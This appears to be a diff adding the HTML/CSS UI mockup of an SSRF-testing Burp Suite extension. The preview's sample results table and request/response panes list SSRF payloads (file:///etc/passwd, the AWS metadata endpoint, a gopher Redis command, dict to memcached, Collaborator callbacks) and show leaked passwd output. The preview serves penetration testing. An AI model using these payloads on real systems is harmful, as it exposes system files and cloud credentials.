@@ -1,0 +1,1407 @@
+<!-- Created with the help of an AI Agent and littlespidy. -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SSRFmap Burp Suite Extension - UI Preview [littlespidy]</title>
+  <style>
+    :root {
+      --bg-primary: #2b2b2b;
+      --bg-secondary: #3c3f41;
+      --bg-tertiary: #313335;
+      --bg-input: #1e1e1e;
+      --border-color: #4e5254;
+      --text-primary: #bbbbbb;
+      --text-highlight: #ffffff;
+      --text-muted: #888888;
+      --accent-orange: #ff7700;
+      --accent-orange-hover: #e06900;
+      --accent-blue: #389fd6;
+      --accent-green: #499c54;
+      --accent-red: #c75450;
+      --selection-bg: #214283;
+      --table-header: #36393b;
+      --table-row-even: #313335;
+      --table-row-odd: #2b2b2b;
+      --table-row-hover: #3a3d40;
+      --table-row-selected: #2d436d;
+      --font-ui: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      --font-mono: "JetBrains Mono", Consolas, "Courier New", monospace;
+    }
+
+    body.light-theme {
+      --bg-primary: #f2f2f2;
+      --bg-secondary: #ffffff;
+      --bg-tertiary: #e6e6e6;
+      --bg-input: #ffffff;
+      --border-color: #c4c4c4;
+      --text-primary: #222222;
+      --text-highlight: #000000;
+      --text-muted: #666666;
+      --accent-orange: #e06000;
+      --accent-orange-hover: #c45400;
+      --accent-blue: #1b6acb;
+      --accent-green: #2e7d32;
+      --accent-red: #c62828;
+      --selection-bg: #b5d5ff;
+      --table-header: #e0e0e0;
+      --table-row-even: #ffffff;
+      --table-row-odd: #f8f8f8;
+      --table-row-hover: #eaeff5;
+      --table-row-selected: #cfe2ff;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: var(--font-ui);
+      font-size: 12px;
+      color: var(--text-primary);
+      background-color: var(--bg-primary);
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      user-select: none;
+    }
+
+    /* Top Bar Header */
+    .top-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 6px 12px;
+      background-color: var(--bg-tertiary);
+      border-bottom: 1px solid var(--border-color);
+    }
+
+    .top-bar-title {
+      font-weight: 700;
+      font-size: 13px;
+      color: var(--text-highlight);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .top-bar-badge {
+      background-color: var(--accent-orange);
+      color: #ffffff;
+      font-size: 10px;
+      font-weight: 600;
+      padding: 2px 6px;
+      border-radius: 3px;
+    }
+
+    .top-bar-controls {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .btn {
+      font-family: var(--font-ui);
+      font-size: 11px;
+      font-weight: 500;
+      padding: 4px 10px;
+      border-radius: 3px;
+      border: 1px solid var(--border-color);
+      background-color: var(--bg-secondary);
+      color: var(--text-primary);
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      transition: background-color 0.15s, border-color 0.15s;
+    }
+
+    .btn:hover {
+      background-color: var(--table-row-hover);
+      border-color: var(--text-muted);
+      color: var(--text-highlight);
+    }
+
+    .btn-primary {
+      background-color: var(--accent-orange);
+      border-color: var(--accent-orange);
+      color: #ffffff;
+      font-weight: 600;
+    }
+
+    .btn-primary:hover {
+      background-color: var(--accent-orange-hover);
+      border-color: var(--accent-orange-hover);
+      color: #ffffff;
+    }
+
+    .btn-danger {
+      background-color: transparent;
+      border-color: var(--accent-red);
+      color: var(--accent-red);
+    }
+
+    .btn-danger:hover {
+      background-color: var(--accent-red);
+      color: #ffffff;
+    }
+
+    /* Root Request Tabs Bar */
+    .root-tabs-bar {
+      display: flex;
+      align-items: center;
+      background-color: var(--bg-tertiary);
+      border-bottom: 1px solid var(--border-color);
+      padding: 0 8px;
+      overflow-x: auto;
+    }
+
+    .root-tab {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 7px 14px;
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--text-muted);
+      border-right: 1px solid var(--border-color);
+      border-left: 1px solid transparent;
+      border-top: 2px solid transparent;
+      cursor: pointer;
+      background-color: transparent;
+      white-space: nowrap;
+    }
+
+    .root-tab:hover {
+      color: var(--text-primary);
+      background-color: var(--bg-secondary);
+    }
+
+    .root-tab.active {
+      color: var(--text-highlight);
+      background-color: var(--bg-primary);
+      border-top: 2px solid var(--accent-orange);
+      border-left: 1px solid var(--border-color);
+      border-right: 1px solid var(--border-color);
+    }
+
+    .tab-close {
+      font-weight: bold;
+      color: var(--text-muted);
+      font-size: 11px;
+      padding: 0 3px;
+      border-radius: 2px;
+    }
+
+    .tab-close:hover {
+      color: #ffffff;
+      background-color: var(--accent-red);
+    }
+
+    .new-tab-btn {
+      padding: 4px 8px;
+      margin-left: 4px;
+      cursor: pointer;
+      color: var(--text-muted);
+      font-weight: bold;
+      border-radius: 3px;
+    }
+
+    .new-tab-btn:hover {
+      color: var(--text-highlight);
+      background-color: var(--bg-secondary);
+    }
+
+    /* Main Split Container */
+    .workspace-split {
+      display: flex;
+      flex: 1;
+      height: calc(100vh - 70px);
+      overflow: hidden;
+    }
+
+    /* Left Pane: Config & Request */
+    .left-pane {
+      width: 48%;
+      min-width: 380px;
+      border-right: 2px solid var(--border-color);
+      background-color: var(--bg-secondary);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .pane-header {
+      padding: 8px 12px;
+      background-color: var(--bg-tertiary);
+      border-bottom: 1px solid var(--border-color);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-weight: 600;
+      color: var(--text-highlight);
+    }
+
+    .target-bar {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 6px 12px;
+      background-color: var(--bg-primary);
+      border-bottom: 1px solid var(--border-color);
+      font-size: 11px;
+    }
+
+    .target-field {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .target-field label {
+      color: var(--text-muted);
+      font-weight: 500;
+    }
+
+    .target-field input, .target-field select {
+      background-color: var(--bg-input);
+      border: 1px solid var(--border-color);
+      color: var(--text-highlight);
+      padding: 3px 6px;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      border-radius: 2px;
+    }
+
+    /* Request Editor Toolbar */
+    .editor-toolbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 6px 12px;
+      background-color: var(--bg-tertiary);
+      border-bottom: 1px solid var(--border-color);
+      gap: 6px;
+    }
+
+    .marker-buttons {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .request-textarea-container {
+      position: relative;
+      flex: 1;
+      min-height: 180px;
+      max-height: 38%;
+      display: flex;
+      background-color: var(--bg-input);
+      border-bottom: 1px solid var(--border-color);
+    }
+
+    .request-editor {
+      width: 100%;
+      height: 100%;
+      border: none;
+      outline: none;
+      resize: none;
+      background-color: var(--bg-input);
+      color: var(--text-highlight);
+      font-family: var(--font-mono);
+      font-size: 11px;
+      line-height: 1.45;
+      padding: 8px 10px;
+      white-space: pre;
+      overflow: auto;
+      user-select: text;
+    }
+
+    /* Config and Modules Scroll Area */
+    .config-scroll-area {
+      flex: 1;
+      overflow-y: auto;
+      padding: 10px 12px;
+      background-color: var(--bg-primary);
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .config-card {
+      background-color: var(--bg-secondary);
+      border: 1px solid var(--border-color);
+      border-radius: 4px;
+      padding: 10px;
+    }
+
+    .card-title {
+      font-weight: 700;
+      color: var(--text-highlight);
+      margin-bottom: 8px;
+      font-size: 11px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid var(--border-color);
+      padding-bottom: 4px;
+    }
+
+    .badge-count {
+      font-size: 10px;
+      padding: 1px 6px;
+      background-color: var(--bg-tertiary);
+      border-radius: 10px;
+      color: var(--accent-orange);
+      border: 1px solid var(--border-color);
+    }
+
+    .module-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 6px 12px;
+    }
+
+    .checkbox-label {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 11px;
+      cursor: pointer;
+      color: var(--text-primary);
+    }
+
+    .checkbox-label input[type="checkbox"] {
+      cursor: pointer;
+      accent-color: var(--accent-orange);
+    }
+
+    .scheme-tag {
+      font-family: var(--font-mono);
+      font-weight: bold;
+      color: var(--accent-orange);
+      background-color: var(--bg-tertiary);
+      padding: 1px 4px;
+      border-radius: 2px;
+      border: 1px solid var(--border-color);
+    }
+
+    .settings-row {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 8px;
+    }
+
+    .setting-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .setting-item label {
+      color: var(--text-muted);
+    }
+
+    .setting-item input[type="number"] {
+      width: 60px;
+      background-color: var(--bg-input);
+      border: 1px solid var(--border-color);
+      color: var(--text-highlight);
+      padding: 3px 6px;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      border-radius: 2px;
+    }
+
+    /* Action Control Footer */
+    .action-footer {
+      padding: 8px 12px;
+      background-color: var(--bg-tertiary);
+      border-top: 1px solid var(--border-color);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+    }
+
+    .progress-container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .progress-bar-bg {
+      height: 7px;
+      background-color: var(--bg-input);
+      border: 1px solid var(--border-color);
+      border-radius: 3px;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 58%;
+      background-color: var(--accent-orange);
+      transition: width 0.3s;
+    }
+
+    .progress-text {
+      font-size: 10px;
+      color: var(--text-muted);
+      display: flex;
+      justify-content: space-between;
+    }
+
+    /* Right Pane: Results and HTTP Traffic */
+    .right-pane {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      background-color: var(--bg-primary);
+      overflow: hidden;
+    }
+
+    .table-toolbar {
+      padding: 6px 12px;
+      background-color: var(--bg-tertiary);
+      border-bottom: 1px solid var(--border-color);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+    }
+
+    .search-filter-box {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      flex: 1;
+      max-width: 420px;
+    }
+
+    .search-filter-box input {
+      flex: 1;
+      background-color: var(--bg-input);
+      border: 1px solid var(--border-color);
+      color: var(--text-highlight);
+      padding: 4px 8px;
+      font-size: 11px;
+      border-radius: 2px;
+      outline: none;
+    }
+
+    .filter-pills {
+      display: flex;
+      gap: 4px;
+    }
+
+    .filter-pill {
+      font-size: 10px;
+      padding: 2px 7px;
+      border-radius: 10px;
+      background-color: var(--bg-secondary);
+      border: 1px solid var(--border-color);
+      color: var(--text-muted);
+      cursor: pointer;
+    }
+
+    .filter-pill.active {
+      background-color: var(--accent-orange);
+      color: #ffffff;
+      border-color: var(--accent-orange);
+      font-weight: 600;
+    }
+
+    /* Results Table */
+    .results-table-container {
+      flex: 1;
+      min-height: 200px;
+      overflow: auto;
+      background-color: var(--bg-input);
+      border-bottom: 2px solid var(--border-color);
+    }
+
+    table.results-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 11px;
+      white-space: nowrap;
+      text-align: left;
+    }
+
+    table.results-table th {
+      background-color: var(--table-header);
+      color: var(--text-highlight);
+      font-weight: 600;
+      padding: 6px 8px;
+      position: sticky;
+      top: 0;
+      border-bottom: 1px solid var(--border-color);
+      border-right: 1px solid var(--border-color);
+      z-index: 10;
+    }
+
+    table.results-table td {
+      padding: 5px 8px;
+      border-bottom: 1px solid var(--border-color);
+      border-right: 1px solid var(--border-color);
+      color: var(--text-primary);
+    }
+
+    table.results-table tr:nth-child(even) {
+      background-color: var(--table-row-even);
+    }
+
+    table.results-table tr:nth-child(odd) {
+      background-color: var(--table-row-odd);
+    }
+
+    table.results-table tr:hover {
+      background-color: var(--table-row-hover);
+      cursor: pointer;
+    }
+
+    table.results-table tr.selected {
+      background-color: var(--table-row-selected) !important;
+      color: #ffffff;
+    }
+
+    table.results-table tr.selected td {
+      color: #ffffff;
+    }
+
+    .tag-status {
+      font-weight: 600;
+      padding: 1px 5px;
+      border-radius: 2px;
+      font-size: 10px;
+    }
+
+    .status-vuln {
+      background-color: rgba(199, 84, 80, 0.25);
+      color: #ff6b68;
+      border: 1px solid var(--accent-red);
+    }
+
+    .status-collab {
+      background-color: rgba(56, 159, 214, 0.25);
+      color: #5bc0de;
+      border: 1px solid var(--accent-blue);
+    }
+
+    .status-ok {
+      background-color: rgba(73, 156, 84, 0.25);
+      color: #62c462;
+      border: 1px solid var(--accent-green);
+    }
+
+    .status-probe {
+      background-color: rgba(187, 187, 187, 0.15);
+      color: #aaaaaa;
+      border: 1px solid var(--border-color);
+    }
+
+    /* Traffic Inspector (Request / Response) */
+    .traffic-inspector {
+      height: 38%;
+      min-height: 180px;
+      display: flex;
+      flex-direction: column;
+      background-color: var(--bg-secondary);
+    }
+
+    .inspector-tabs-bar {
+      display: flex;
+      background-color: var(--bg-tertiary);
+      border-bottom: 1px solid var(--border-color);
+      padding: 0 8px;
+    }
+
+    .inspector-tab {
+      padding: 5px 12px;
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--text-muted);
+      cursor: pointer;
+      border-bottom: 2px solid transparent;
+    }
+
+    .inspector-tab.active {
+      color: var(--text-highlight);
+      border-bottom: 2px solid var(--accent-orange);
+      background-color: var(--bg-secondary);
+    }
+
+    .inspector-body {
+      display: flex;
+      flex: 1;
+      overflow: hidden;
+    }
+
+    .inspector-viewer-pane {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      border-right: 1px solid var(--border-color);
+    }
+
+    .inspector-viewer-pane:last-child {
+      border-right: none;
+    }
+
+    .viewer-header {
+      padding: 4px 10px;
+      background-color: var(--bg-tertiary);
+      border-bottom: 1px solid var(--border-color);
+      font-size: 10px;
+      font-weight: 600;
+      color: var(--text-muted);
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .viewer-content {
+      flex: 1;
+      background-color: var(--bg-input);
+      color: var(--text-highlight);
+      font-family: var(--font-mono);
+      font-size: 11px;
+      line-height: 1.4;
+      padding: 8px 10px;
+      overflow: auto;
+      white-space: pre;
+      user-select: text;
+    }
+
+    .highlight-marker {
+      background-color: rgba(255, 119, 0, 0.3);
+      border: 1px dashed var(--accent-orange);
+      color: #ff9933;
+      padding: 0 2px;
+      border-radius: 2px;
+      font-weight: bold;
+    }
+
+    .highlight-diff {
+      background-color: rgba(73, 156, 84, 0.35);
+      color: #70db70;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Bar -->
+  <div class="top-bar">
+    <div class="top-bar-title">
+      <span>SSRFmap - SSRF Automation and Testing</span>
+      <span class="top-bar-badge">v1.0.0 [littlespidy]</span>
+    </div>
+    <div class="top-bar-controls">
+      <button class="btn" id="themeToggleBtn" onclick="toggleTheme()">Light Theme</button>
+      <button class="btn" onclick="alert('Montoya API Extension connected to Burp Suite. Author: littlespidy')">About</button>
+    </div>
+  </div>
+
+  <!-- Root Request Tabs -->
+  <div class="root-tabs-bar" id="rootTabsBar">
+    <div class="root-tab active" data-tab-id="1" onclick="switchSessionTab(1)">
+      <span>1: POST /api/v1/import/url</span>
+      <span class="tab-close" onclick="event.stopPropagation(); closeSessionTab(1)">x</span>
+    </div>
+    <div class="root-tab" data-tab-id="2" onclick="switchSessionTab(2)">
+      <span>2: GET /fetch_document</span>
+      <span class="tab-close" onclick="event.stopPropagation(); closeSessionTab(2)">x</span>
+    </div>
+    <div class="root-tab" data-tab-id="3" onclick="switchSessionTab(3)">
+      <span>3: POST /webhook/receiver</span>
+      <span class="tab-close" onclick="event.stopPropagation(); closeSessionTab(3)">x</span>
+    </div>
+    <div class="new-tab-btn" onclick="addNewSessionTab()">+ New Tab</div>
+  </div>
+
+  <!-- Workspace Split Pane -->
+  <div class="workspace-split">
+
+    <!-- Left Pane: Configuration & Target Request with Marker -->
+    <div class="left-pane">
+      <div class="pane-header">
+        <span>Request Configuration and Marker Placement</span>
+        <span style="font-size: 10px; color: var(--text-muted);">Burp Intruder Style Marker (§)</span>
+      </div>
+
+      <!-- Target Info Bar -->
+      <div class="target-bar">
+        <div class="target-field">
+          <label>Host:</label>
+          <input type="text" id="targetHost" value="target-app.internal.corp" style="width: 170px;">
+        </div>
+        <div class="target-field">
+          <label>Port:</label>
+          <input type="text" id="targetPort" value="443" style="width: 45px;">
+        </div>
+        <div class="target-field">
+          <label>Protocol:</label>
+          <select id="targetProtocol">
+            <option value="https" selected>HTTPS</option>
+            <option value="http">HTTP</option>
+          </select>
+        </div>
+      </div>
+
+      <!-- Request Editor Toolbar -->
+      <div class="editor-toolbar">
+        <div class="marker-buttons">
+          <button class="btn btn-primary" onclick="addMarker()">Add Section Marker (§)</button>
+          <button class="btn" onclick="clearMarkers()">Clear Markers (§)</button>
+          <button class="btn" onclick="autoDetectMarker()">Auto-Detect Marker</button>
+        </div>
+        <span style="font-size: 10px; color: var(--text-muted);" id="markerInfoLabel">1 marker defined: §...§</span>
+      </div>
+
+      <!-- Request Textarea Editor -->
+      <div class="request-textarea-container">
+        <textarea class="request-editor" id="rawRequestArea" spellcheck="false">POST /api/v1/import/url HTTP/1.1
+Host: target-app.internal.corp
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json, text/plain, */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Connection: close
+
+url=§https://external.service.com/schema.json§&format=json&sync=true</textarea>
+      </div>
+
+      <!-- Config and Modules Scroll Area -->
+      <div class="config-scroll-area">
+
+        <!-- Module Selection: Protocols (The 7 requested protocols) -->
+        <div class="config-card">
+          <div class="card-title">
+            <span>Protocol Schemes (7 Core Vectors)</span>
+            <span class="badge-count">7 Selected</span>
+          </div>
+          <div class="module-grid">
+            <label class="checkbox-label">
+              <input type="checkbox" checked> <span class="scheme-tag">file://</span> Local File Disclosure
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox" checked> <span class="scheme-tag">dict://</span> Dictionary Service Probing
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox" checked> <span class="scheme-tag">sftp://</span> SFTP Network Probe
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox" checked> <span class="scheme-tag">tftp://</span> TFTP UDP Interaction
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox" checked> <span class="scheme-tag">ldap://</span> LDAP Callback Injection
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox" checked> <span class="scheme-tag">smtp://</span> SMTP Mail Injection
+            </label>
+            <label class="checkbox-label" style="grid-column: span 2;">
+              <input type="checkbox" checked> <span class="scheme-tag">gopher://</span> Raw TCP Protocol Smuggling (Redis/FastCGI/Memcache)
+            </label>
+          </div>
+        </div>
+
+        <!-- Module Selection: Cloud Metadata -->
+        <div class="config-card">
+          <div class="card-title">
+            <span>Cloud Metadata Services</span>
+            <span class="badge-count">4 Selected</span>
+          </div>
+          <div class="module-grid">
+            <label class="checkbox-label">
+              <input type="checkbox" checked> AWS EC2 (IMDSv1 & IMDSv2)
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox" checked> Google Cloud (ComputeMetadata)
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox" checked> Alibaba Cloud (100.100.100.200)
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox" checked> DigitalOcean Metadata
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox"> Azure Instance Metadata
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox"> Kubernetes Service Accounts
+            </label>
+          </div>
+        </div>
+
+        <!-- Module Selection: Service Exploits (SSRFmap modules) -->
+        <div class="config-card">
+          <div class="card-title">
+            <span>SSRFmap Service Exploits and Probing</span>
+            <span class="badge-count">5 Selected</span>
+          </div>
+          <div class="module-grid">
+            <label class="checkbox-label">
+              <input type="checkbox" checked> Redis (INFO, Command Injection)
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox" checked> Docker Engine API (/v1.40)
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox" checked> FastCGI (PHP-FPM Tunnel)
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox" checked> ReadFiles (Linux/Windows Diffs)
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox"> Memcached (Stats, Slab Dump)
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox"> Internal Port Scanner (Top 50 Ports)
+            </label>
+          </div>
+        </div>
+
+        <!-- Attack Settings -->
+        <div class="config-card">
+          <div class="card-title">
+            <span>Execution and Detection Options</span>
+          </div>
+          <div class="settings-row">
+            <div class="setting-item">
+              <label>Concurrency:</label>
+              <input type="number" value="5" min="1" max="50">
+            </div>
+            <div class="setting-item">
+              <label>Delay (ms):</label>
+              <input type="number" value="50" min="0" step="10">
+            </div>
+            <div class="setting-item">
+              <label>Timeout (s):</label>
+              <input type="number" value="10" min="1" max="60">
+            </div>
+          </div>
+          <div style="display: flex; flex-direction: column; gap: 6px;">
+            <label class="checkbox-label">
+              <input type="checkbox" checked> Use Burp Collaborator for blind out-of-band protocols (DNS/HTTP/SMTP)
+            </label>
+            <label class="checkbox-label">
+              <input type="checkbox" checked> Automated baseline request and intelligent response diff analysis
+            </label>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Action Footer -->
+      <div class="action-footer">
+        <button class="btn btn-primary" id="startAttackBtn" onclick="toggleAttack()">Start Attack</button>
+        <button class="btn" onclick="pauseAttack()">Pause</button>
+        <button class="btn btn-danger" onclick="stopAttack()">Stop</button>
+
+        <div class="progress-container">
+          <div class="progress-bar-bg">
+            <div class="progress-bar-fill" id="progressBar"></div>
+          </div>
+          <div class="progress-text">
+            <span id="progressStatusText">Running: 42 / 72 requests completed</span>
+            <span id="progressPercentText">58%</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Right Pane: Live Attack Logs and Request / Response Inspection -->
+    <div class="right-pane">
+
+      <!-- Table Filter Toolbar -->
+      <div class="table-toolbar">
+        <div class="search-filter-box">
+          <input type="text" id="tableFilterInput" placeholder="Filter by scheme, payload, status, or indicator..." onkeyup="filterTable()">
+        </div>
+        <div class="filter-pills">
+          <div class="filter-pill active" onclick="setFilterCategory(this, 'all')">All (9)</div>
+          <div class="filter-pill" onclick="setFilterCategory(this, 'vuln')">Vulnerable (4)</div>
+          <div class="filter-pill" onclick="setFilterCategory(this, 'collab')">Collaborator Hits (3)</div>
+          <div class="filter-pill" onclick="setFilterCategory(this, 'probed')">Probed (2)</div>
+        </div>
+        <div>
+          <button class="btn" onclick="clearTable()">Clear Results</button>
+        </div>
+      </div>
+
+      <!-- Results Table -->
+      <div class="results-table-container">
+        <table class="results-table" id="resultsTable">
+          <thead>
+            <tr>
+              <th style="width: 35px;">#</th>
+              <th style="width: 80px;">Module</th>
+              <th style="width: 75px;">Scheme</th>
+              <th>Payload</th>
+              <th style="width: 65px;">Status</th>
+              <th style="width: 70px;">Length</th>
+              <th style="width: 70px;">Time</th>
+              <th>Diff / Match Indicator</th>
+              <th style="width: 140px;">Collaborator</th>
+              <th style="width: 95px;">Result</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr class="selected" onclick="selectRow(this, 0)" data-category="base">
+              <td>0</td>
+              <td>baseline</td>
+              <td>https://</td>
+              <td>https://external.service.com/schema.json</td>
+              <td>200 OK</td>
+              <td>1420 B</td>
+              <td>112 ms</td>
+              <td>Original baseline (0 B diff)</td>
+              <td>None</td>
+              <td><span class="tag-status status-ok">BASELINE</span></td>
+            </tr>
+            <tr onclick="selectRow(this, 1)" data-category="vuln">
+              <td>1</td>
+              <td>readfiles</td>
+              <td>file://</td>
+              <td>file:///etc/passwd</td>
+              <td>200 OK</td>
+              <td>2854 B</td>
+              <td>84 ms</td>
+              <td>+1434 B (Matched: root:x:0:0:)</td>
+              <td>None</td>
+              <td><span class="tag-status status-vuln">VULNERABLE</span></td>
+            </tr>
+            <tr onclick="selectRow(this, 2)" data-category="vuln">
+              <td>2</td>
+              <td>aws</td>
+              <td>http://</td>
+              <td>http://169.254.169.254/latest/meta-data/</td>
+              <td>200 OK</td>
+              <td>1890 B</td>
+              <td>95 ms</td>
+              <td>+470 B (Matched: ami-id, iam)</td>
+              <td>None</td>
+              <td><span class="tag-status status-vuln">VULNERABLE</span></td>
+            </tr>
+            <tr onclick="selectRow(this, 3)" data-category="collab">
+              <td>3</td>
+              <td>smtp</td>
+              <td>smtp://</td>
+              <td>smtp://x7q9b.burpcollaborator.net:25/</td>
+              <td>504 Timeout</td>
+              <td>520 B</td>
+              <td>10020 ms</td>
+              <td>-900 B (Connection timed out)</td>
+              <td>SMTP Interaction (Port 25)</td>
+              <td><span class="tag-status status-collab">COLLAB HIT</span></td>
+            </tr>
+            <tr onclick="selectRow(this, 4)" data-category="collab">
+              <td>4</td>
+              <td>ldap</td>
+              <td>ldap://</td>
+              <td>ldap://x7q9b.burpcollaborator.net:389/dc=ssrf</td>
+              <td>502 Gateway</td>
+              <td>480 B</td>
+              <td>1240 ms</td>
+              <td>-940 B (Upstream parse failure)</td>
+              <td>DNS & LDAP Callback</td>
+              <td><span class="tag-status status-collab">COLLAB HIT</span></td>
+            </tr>
+            <tr onclick="selectRow(this, 5)" data-category="vuln">
+              <td>5</td>
+              <td>redis</td>
+              <td>gopher://</td>
+              <td>gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a</td>
+              <td>200 OK</td>
+              <td>3410 B</td>
+              <td>78 ms</td>
+              <td>+1990 B (Matched: redis_version:)</td>
+              <td>None</td>
+              <td><span class="tag-status status-vuln">VULNERABLE</span></td>
+            </tr>
+            <tr onclick="selectRow(this, 6)" data-category="vuln">
+              <td>6</td>
+              <td>dict</td>
+              <td>dict://</td>
+              <td>dict://127.0.0.1:11211/stat</td>
+              <td>200 OK</td>
+              <td>2100 B</td>
+              <td>64 ms</td>
+              <td>+680 B (Matched: STAT pid)</td>
+              <td>None</td>
+              <td><span class="tag-status status-vuln">VULNERABLE</span></td>
+            </tr>
+            <tr onclick="selectRow(this, 7)" data-category="collab">
+              <td>7</td>
+              <td>sftp</td>
+              <td>sftp://</td>
+              <td>sftp://x7q9b.burpcollaborator.net:22/probe</td>
+              <td>500 Error</td>
+              <td>512 B</td>
+              <td>2150 ms</td>
+              <td>-908 B (Internal error)</td>
+              <td>TCP Connection on Port 22</td>
+              <td><span class="tag-status status-collab">COLLAB HIT</span></td>
+            </tr>
+            <tr onclick="selectRow(this, 8)" data-category="probed">
+              <td>8</td>
+              <td>tftp</td>
+              <td>tftp://</td>
+              <td>tftp://x7q9b.burpcollaborator.net:69/test</td>
+              <td>500 Error</td>
+              <td>512 B</td>
+              <td>3020 ms</td>
+              <td>-908 B (No response received)</td>
+              <td>None</td>
+              <td><span class="tag-status status-probe">PROBED</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <!-- Traffic Inspector: Request & Response Tabs -->
+      <div class="traffic-inspector">
+        <div class="inspector-tabs-bar">
+          <div class="inspector-tab active" id="tabReqResp" onclick="switchInspectorTab('reqresp')">Raw Request & Response</div>
+          <div class="inspector-tab" id="tabDiff" onclick="switchInspectorTab('diff')">Response Diff Analysis</div>
+          <div class="inspector-tab" id="tabCollab" onclick="switchInspectorTab('collab')">Collaborator Details</div>
+        </div>
+
+        <div class="inspector-body" id="reqRespPane">
+          <div class="inspector-viewer-pane">
+            <div class="viewer-header">
+              <span>Executed Request</span>
+              <span id="reqViewerInfo">Payload: file:///etc/passwd</span>
+            </div>
+            <div class="viewer-content" id="executedRequestContent">POST /api/v1/import/url HTTP/1.1
+Host: target-app.internal.corp
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json, text/plain, */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+Connection: close
+
+url=file:///etc/passwd&format=json&sync=true</div>
+          </div>
+
+          <div class="inspector-viewer-pane">
+            <div class="viewer-header">
+              <span>Target Response (Status: 200 OK | Size: 2854 B | Time: 84 ms)</span>
+              <span style="color: var(--accent-red); font-weight: bold;">LFI / SSRF MATCH DETECTED</span>
+            </div>
+            <div class="viewer-content" id="executedResponseContent">HTTP/1.1 200 OK
+Date: Wed, 05 Nov 2026 12:20:00 GMT
+Content-Type: application/json
+Content-Length: 2854
+Connection: close
+
+{
+  "status": "success",
+  "document_contents": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nnode:x:1000:1000:NodeJS App:/home/node:/bin/bash\n"
+}</div>
+          </div>
+        </div>
+
+        <div class="inspector-body" id="diffPane" style="display: none;">
+          <div class="inspector-viewer-pane">
+            <div class="viewer-header">
+              <span>Added Response Lines Compared to Baseline</span>
+              <span style="color: var(--accent-green); font-weight: bold;">+1434 Bytes Delta</span>
+            </div>
+            <div class="viewer-content" id="diffViewerContent"><span class="highlight-diff">+ root:x:0:0:root:/root:/bin/bash</span>
+<span class="highlight-diff">+ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
+<span class="highlight-diff">+ bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
+<span class="highlight-diff">+ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
